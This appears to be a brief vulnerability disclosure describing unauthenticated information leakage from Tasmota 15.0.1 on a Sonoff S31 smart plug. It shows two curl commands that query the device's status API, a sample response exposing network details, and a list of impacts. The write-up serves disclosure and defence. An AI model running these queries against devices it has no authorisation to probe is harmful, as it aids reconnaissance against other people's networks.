#  Information Leakage via Status API

## 📋 Summary
The Tasmota firmware version 15.0.1 running on the Sonoff S31 smart plug exposes sensitive internal data to any device on the same network without requiring authentication. Using the `Status 11` and `Info` commands, an attacker can retrieve details about the device’s network configuration, uptime, firmware, and MQTT setup.

##  Example Commands
```bash
curl "http://172.21.56.214/cm?cmnd=Status%2011"
curl "http://172.21.56.214/cm?cmnd=Info"
```

## Sample Response
```bash
{
  "StatusNET": {
    "Hostname": "tasmota-XXXX",
    "IPAddress": "172.21.56.214",
    "Gateway": "172.21.56.1",
    "Mac": "A0:20:A6:xx:xx:xx",
    ...
  }
}
```

## Impact 
- Reveals Wi-Fi network details (SSID, MAC address)

- Aids attacker reconnaissance

- Can be used to fingerprint and track devices

- Makes brute-force and spoofing attacks easier
